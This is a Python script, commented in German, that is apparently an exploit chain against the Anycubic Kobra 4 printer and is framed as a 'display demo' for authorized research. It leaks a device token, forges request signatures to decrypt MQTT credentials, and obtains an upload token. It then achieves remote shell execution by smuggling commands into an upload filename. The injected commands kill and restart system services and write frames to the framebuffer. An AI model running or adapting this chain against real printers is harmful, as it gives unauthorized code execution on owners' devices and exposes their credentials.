#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
K4 Display Demo — Video-Schleife auf dem Anycubic Kobra 4 Display (autorisierte Forschung)
=========================================================================================
Spielt ein kurzes Video als Endlos-Schleife auf dem Drucker-Display (480x320).
Funktioniert auf Vanilla-Firmware (kein seq/pidof/awk benoetigt).

Nutzung:
  python3 k4_display.py <ip>
  K4_HTTP_PORT=18912 K4_MQTT_PORT=9885 python3 k4_display.py 127.0.0.1

Nur fuer autorisierte Nutzung am eigenen Geraet.
Deps: pip install paho-mqtt pycryptodome
"""
import base64, hashlib, io, json, lzma, os, re, socket, ssl, sys, time, zipfile
try:
    from Crypto.Cipher import AES
except ImportError:
    sys.exit("pip install pycryptodome")

HTTP_PORT = int(os.environ.get("K4_HTTP_PORT", "18910"))
MQTT_PORT = int(os.environ.get("K4_MQTT_PORT", "9883"))
MODEL_ID = "20028"

TEMPLATE_B64 = ""


def http(ip, method, path, headers, body, timeout=90):
    req = f"{method} {path} HTTP/1.1\r\nHost: {ip}:{HTTP_PORT}\r\n"
    req += "".join(f"{k}: {v}\r\n" for k, v in headers.items())
    req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    raw = req.encode() + body
    s = socket.create_connection((ip, HTTP_PORT), timeout=timeout)
    try:
        s.sendall(raw)
        resp = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    finally:
        s.close()
    head, _, payload = resp.partition(b"\r\n\r\n")
    if not head.startswith(b"HTTP/"):
        raise RuntimeError("no HTTP response (handler wedged by injection?)")
    return int(head.split(b" ")[1]), payload

def get_info_token(ip):
    st, body = http(ip, "GET", "/info", {}, b"", 10)
    if st != 200:
        raise RuntimeError(f"/info -> {st}")
    return json.loads(body)["token"]

def get_mqtt_creds(ip, info_token):
    ts = str(int(time.time() * 1000))
    nonce = f"k4x{int(time.time()%99999999)}"          # >= 6 chars, else "nonce invalid"
    inner = hashlib.md5(info_token[:16].encode()).hexdigest()
    sign = hashlib.md5((inner + ts + nonce).encode()).hexdigest()
    path = f"/ctrl?ts={ts}&nonce={nonce}&did=k4x&sign={sign}"   # did is not validated
    st, body = http(ip, "POST", path, {}, b"", 15)
    if st != 200:
        raise RuntimeError(f"/ctrl -> {st}")
    blob = base64.b64decode(json.loads(body)["data"]["info"])
    plain = AES.new(info_token[16:32].encode(), AES.MODE_CBC, blob[:16]).decrypt(blob[16:])
    user = re.search(rb'"username":\s*"([^"]+)"', plain).group(1).decode()
    pw = re.search(rb'"password":\s*"([^"]+)"', plain).group(1).decode()
    dev = re.search(rb'"deviceId":\s*"([^"]+)"', plain).group(1).decode()
    return user, pw, dev

def build_3mf(payload_bytes):
    """Proven 17-entry slicer 3MF container; inner plate_1.gcode = payload."""
    zin = zipfile.ZipFile(io.BytesIO(base64.b64decode(TEMPLATE_B64)))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zo:
        for info in zin.infolist():
            if info.filename == "Metadata/plate_1.gcode":
                zo.writestr(info.filename, payload_bytes)
            elif info.filename == "Metadata/plate_1.gcode.md5":
                zo.writestr(info.filename, hashlib.md5(payload_bytes).hexdigest().encode())
            else:
                zo.writestr(info.filename, zin.read(info.filename))
    return buf.getvalue()

def upload(ip, token, name, payload_bytes):
    """Two-part slicer upload. name is saved as /data/gcodes/<name minus .3mf>."""
    zm = build_3mf(payload_bytes)
    b = "----k4xboundary"
    body = (f"--{b}\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n{name}\r\n"
            f"--{b}\r\nContent-Disposition: form-data; name=\"gcode\"; filename=\"x\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n").encode() + zm + f"\r\n--{b}--\r\n".encode()
    st, resp = http(ip, "POST", f"/gcode_upload?s={token}",
                    {"X-File-Length": str(len(zm)),
                     "Content-Type": f"multipart/form-data; boundary={b}"}, body)
    try:
        code = json.loads(resp)["code"]
    except Exception:
        code = None
    if code != 200:
        raise RuntimeError(f"upload {name} -> {st} {resp[:120]}")
    return json.loads(resp)["data"]["gcode"]

def get_upload_token(ip, user, pw, dev, verbose=True):
    import paho.mqtt.client as mqtt
    got, connected = [], []
    def on_connect(c, u, f, rc):
        c.subscribe([("#", 0)]); connected.append(rc)
    def on_message(c, u, m):
        got.append(m.payload)
    c = mqtt.Client(protocol=mqtt.MQTTv311)
    c.username_pw_set(user, pw)
    c.tls_set(cert_reqs=ssl.CERT_NONE); c.tls_insecure_set(True)
    c.on_connect, c.on_message = on_connect, on_message
    c.connect(ip, MQTT_PORT, 60); c.loop_start()
    t0 = time.time()
    while not connected and time.time() - t0 < 10:
        time.sleep(0.2)
    if not connected or connected[0] != 0:
        raise RuntimeError("MQTT connect failed")
    myid = f"k4x-{int(time.time())}"
    topic = f"anycubic/anycubicCloud/v1/slicer/printer/{MODEL_ID}/{dev}/info"
    c.publish(topic, json.dumps({"type": "info", "action": "query",
                                 "msgid": myid, "data": {}}), qos=1)
    token = None
    t0 = time.time()
    while time.time() - t0 < 25:
        for p in got:
            m = re.search(rb"fileUploadurl\":\"http://[^?]+\?s=([A-Za-z0-9]+)", p)
            if m:
                token = m.group(1).decode(); break
        if token:
            break
        time.sleep(0.3)
    c.loop_stop(); c.disconnect()
    if not token:
        raise RuntimeError("no fileUploadurl in status report")
    if verbose:
        print(f"[+] upload token: {token}")
    return token

def chain(ip, verbose=True):
    t0 = time.time()
    tok = get_info_token(ip)
    if verbose: print(f"[+] info token:   {tok}")
    user, pw, dev = get_mqtt_creds(ip, tok)
    if verbose: print(f"[+] MQTT creds:   {user} / device {dev[:8]}...")
    up = get_upload_token(ip, user, pw, dev, verbose)
    if verbose: print(f"[+] chain complete in {time.time()-t0:.1f}s")
    return up

RUNNER = "k4x0"                      # uploaded & executed as /data/gcodes/k4x0.gcode
INJECT_NAME = f"x';sh /data/gcodes/{RUNNER}.gcode>/dev/null 2>&1 &#.gcode.3mf"

# The injection wedges avata_main's HTTP handler thread on this build. The runner
# script survives as an orphaned child, so it can kill and restart the service,
# healing the very DoS it caused (env mirrors /app/start.sh).
HEAL = (
    # every instance + the broker it spawned (orphaned mosquitto keeps :9883
    # and blocks a clean restart), then relaunch; avata_main re-spawns mosquitto
    "for p in $(pidof avata_main); do kill -9 $p; done\n"
    "kill -9 $(pidof mosquitto) 2>/dev/null\n"
    "sleep 2\n"
    "export LD_LIBRARY_PATH=/app/lib\n"
    "export TEMPERATURE_SENSOR_CONFIG=/app/etc/sensors.cfg\n"
    "/app/bin/avata_main -l /data/logs/avata_main.log /app/etc/avata_main.cfg >/dev/null 2>&1 &\n"
)



def main():
    ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    here = os.path.dirname(os.path.abspath(__file__))
    content = os.path.join(here, "content")
    files = sorted(f for f in os.listdir(content) if f.endswith(".b64"))
    if not files:
        sys.exit("keine Frames in content/")
    frames = []
    for f in files:
        b64 = "".join(open(os.path.join(content, f)).read().split())
        xz_data = base64.b64decode(b64)
        frames.append(lzma.decompress(xz_data))
    print(f"K4 Display Demo: {len(frames)} Frames")

    up = chain(ip)
    ok = 0
    for i, frame in enumerate(frames):
        try:
            upload(ip, up, f"slide{i}.gcode.3mf", frame)
            ok += 1
            print(f"    frame {i+1}/{len(frames)}")
        except RuntimeError as e:
            if "19006" in str(e):
                print(f"    frame {i+1}/{len(frames)} — uebersprungen")
            else:
                raise
    print(f"    {ok}/{len(frames)} Frames hochgeladen")

    payload = ("x';"
        "LP=$$;"
        "P=$(ps|grep '[a]vata_ui'|while read p r;do echo $p;break;done);"
        "kill -STOP $P;"
        "(head -c 1 /dev/input/event0 2>/dev/null;kill $LP 2>/dev/null;kill $P 2>/dev/null;sleep 1;export LD_LIBRARY_PATH=/app/lib;export TEMPERATURE_SENSOR_CONFIG=/app/etc/sensors.cfg;/app/bin/avata_ui -c /app/etc/avata_ui.cfg>/dev/null 2>&1 &)&"
        "i=0;"
        "while :;do "
        "  while [ $i -lt %d ];do cat /data/gcodes/slide$i.gcode>/dev/fb0 2>/dev/null;sleep 0.33;i=$((i+1));done;"
        "  i=0;"
        "done;"
        "#.gcode.3mf") % ok
    import threading
    def _inject():
        try:
            upload(ip, up, payload, b"x")
        except Exception:
            pass
    threading.Thread(target=_inject, daemon=True).start()
    import time as _t; _t.sleep(3)
    print(f"[+] Demo laeuft ({ok} Frames, Endlos-Loop)")
    os._exit(0)


if __name__ == "__main__":
    main()
